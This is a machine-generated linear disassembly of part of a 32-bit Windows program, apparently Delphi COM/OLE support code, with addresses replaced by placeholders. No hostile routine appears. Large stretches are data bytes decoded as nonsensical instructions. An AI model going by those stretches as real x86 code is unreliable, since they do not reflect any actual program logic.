call [ eax + 0x8 ]
sub_47a1e0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_417ae4
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_417ae4
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_47a258
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a2ce
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a2d5
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404a58
call CoUninitialize
sub_47a2d8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_479820
mov eax sub_479e94
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_47a104
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_47a1e0
sub_47a330
push 0xd6004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl bl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_47a37d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a384
retn
sub_47a394
adc [ 0x72615654 ] ecx
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
or al 0x0
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ ecx ] cl
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
and [ edi + eax * 2 + 0xc00 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
and [ edi + eax * 2 + 0xc00 ] 0x0
add [ eax ] al
add [ eax ] al
mov eax eax
sub [ ebp - 0x5b61ffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
movsd [ edi ] [ esi ]
inc edi
add [ eax ] dl
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x54
push ebx
jb r-xdata
jb r-xdata
add cl bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl bl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_47a37d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a384
retn
inc eax
add ah al
mov [ 0xc030047 ] eax
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah [ esi + r--data ]
jb r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
shl [ ebx + 0x630e0047 ] 0x6b
push edx
jne r-xdata
add [ ebx ] al
or al 0x54
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
add al 0x11
inc eax
add [ eax + eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
jb r-xdata
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] al
add [ eax ] al
jbe r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
in al 0xa9
inc edi
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ edx + ebp * 4 ] dh
inc edi
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ esp + ebp * 4 ] dl
inc edi
add [ eax + 0x540047a9 ] dl
sub al [ eax ]
pop esp
stosb [ edi ]
inc edi
add [ eax - 0x56 ] bl
inc edi
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
inc eax
add [ esi + 0x47 ] al
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax ] dl
add [ eax ] al
add [ eax ] al
and [ esi - 0x59bbffb9 ] ah
inc edi
outsb
je r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a96e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_405054
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp sub_47a770
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_47a7b0
outsb
jae r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_47a760
mov eax ebx
call sub_403308
xor eax eax
jmp r-xdata
outsd
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
arpl [ ebp + r--data ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
fsub [ ebp - 0x5a90ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x47 ] al
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
add [ eax + eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
movsd [ edi ] [ esi ]
inc edi
add [ eax + 0x500418f ] bl
add [ ecx ] cl
dec edi
insb
push ebx
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
add [ ebx - 0x5c ] al
inc edi
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f878
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f878
inc ebx
dec edi
jne r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
inc edi
add [ ecx ] bh
movsb [ edi ] [ esi ]
inc edi
jb r-xdata
inc eax
add al bh
stosd [ edi ]
inc edi
add [ eax ] dl
lodsb [ esi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
clc
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add [ ebp - 0x5c ] cl
inc edi
add [ edi - 0x5c ] dl
inc edi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
cmp [ edi + eax * 2 + 0x47a44300 ] esp
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
je r-xdata
outsd
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + eax * 8 - 0x5d ] si
inc edi
add al ah
stosd [ edi ]
inc edi
add ah dh
stosd [ edi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a975
inc edi
inc edi
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f878
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f878
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
sub_47a70c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_47a760
mov eax ebx
call sub_403308
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_47a770
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47ac3c
sub_47a790
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47ac4c
sub_47a990
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a6e0
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47a9e4
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_47a980
mov eax [ esi + 0x38 ]
push eax
call sub_47a790
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_403254
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_47aa34
push ebx
mov ebx eax
mov eax ebx
call sub_420414
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47abf8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_47aa5c
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47aba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47abe0
sub al 0x1
jb r-xdata
mov eax esi
call sub_405a08
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_417ae4
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47abad
lea eax [ ebp - 0x24 ]
call sub_4046b0
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc8
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_479528
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_479528
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_405a08
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_417ae4
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_4794fc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_4794d0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_4092bc
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479334
call sub_4039e0
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_4047fc
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_479560
jmp r-xdata
sub_47ac14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_47ac5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47ac81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ac88
retn
sub_47aca8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47accd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47acd4
retn
sub_47ace0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47ad05
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ad0c
retn
sub_47ad46
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0x6d
lodsd [ esi ]
inc edi
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ad74
retn
sub_47ad80
test [ ebp + 0xb0f0047 ] ch
dec ecx
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
scasb [ edi ]
imul esp [ edx + 0x6c ] 0x4011e465
add [ ecx ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
mov eax eax
and al 0xaf
inc edi
je r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ade0
retn
xchg [ ecx + 0x3d ] esp
cmp al 0xcf
adc [ ecx + 0xaa000c ] eax
cmp [ ebx + 0x664f0871 ] bl
imul sp [ ebx + 0x65 ] 0x5058
pop ds
add bh bh
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0xd9
lodsd [ esi ]
inc edi
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
cmp [ edi - 0x50beffb9 ] ebp
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
add al 0x24
retn
popad
jo r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp sub_405adc
outsd
je r-xdata
add [ esi + 0x47ae ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] ah
inc edi
add [ eax + eax ] dl
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add [ ebx - 0x62ffb850 ] dl
mov al 0x47
add [ edi - 0x78ffb850 ] ah
mov al 0x47
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
jb r-xdata
inc edi
add [ ebx - 0x51 ] dh
inc edi
add [ ebp - 0x51 ] bh
inc edi
add [ edi + 0x670047af ] al
scasd [ edi ]
inc edi
add [ edx ] al
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x200047af ] 0x0
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
add [ ebp - 0x51 ] bl
inc edi
add [ ecx ] bh
scasd [ edi ]
inc edi
add [ ecx - 0x51 ] al
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
inc edi
add [ eax + eax ] bl
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ eax - 0x3bffb84c ] bl
mov ah 0x47
add [ edx + ebp + 0x40 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] dh
add [ eax ] al
mov ah 0x11
inc eax
add [ eax + eax ] dl
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add [ eax - 0x52 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x52 ] bl
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
jae r-xdata
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0xb0b4da82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0xb0c8da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov cl 0x47
add al bl
mov al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] ch
inc edi
add [ eax ] ch
add [ eax ] al
add ah ch
cmp eax 0xafa7da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc eax
mov al 0x47
add [ edi + 0x47af ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] cl
inc edi
add [ eax ] ch
add [ eax ] al
add ah ch
lodsd [ esi ]
inc edi
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cwde
mov ah 0x47
add [ eax ] bl
mov eax 0xb6500047
inc edi
add [ esp + edx * 2 ] cl
inc esi
outsd
outsb
je r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bae9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_47b5eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc esp
and al 0x4
loopne r-xdata
inc edi
add [ ebp - 0x50 ] bh
inc edi
add [ ecx - 0x50 ] bl
inc edi
add [ ecx - 0x50 ] ah
inc edi
inc edi
add ah dl
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47baf0
lea eax [ ebp - 0x2c ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4236b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047fc
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_40480c
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_42372c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
int3
inc ecx
stosb [ edi ]
clc
inc [ ebx - 0x1ffbdbbc ]
jmp sub_405adc
lodsd [ esi ]
inc edi
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cwde
mov ah 0x47
add ah al
mov ah 0x47
add ah al
mov ebx 0x540f0047
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
rol [ edi ] 0xf4
rol [ edi ] 0xd0
pop ebp
inc edx
add [ eax ] bh
rol [ edi ] 0x80
rol [ edi ] 0x38
pop esi
inc edx
add [ eax + 0x480047c1 ] ah
pop esi
inc edx
add [ eax ] dl
pop ebx
inc edx
add al ch
rol [ edi ] 0xdc
pop ebp
inc edx
add ah ch
rol [ edi ] 0x3c
retn 0x47
mov cl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x47
add [ edx + esi * 4 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov dl 0x47
add [ eax + eax ] ch
add [ eax ] al
pop esp
and [ edx ] al
pushfd
xor al 0x40
add [ ebp + ebp * 4 + 0x41 ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 + 0x5bb80041 ] ch
inc edx
add [ eax - 0x3ffb842 ] bl
lodsd [ esi ]
inc ecx
add ah cl
mov esi 0xbed00047
inc edi
add [ esp + ebx * 2 ] al
inc edx
add ah bl
mov edi 0xc0500047
inc edi
add [ eax - 0x2bffb840 ] bh
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_47bcf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
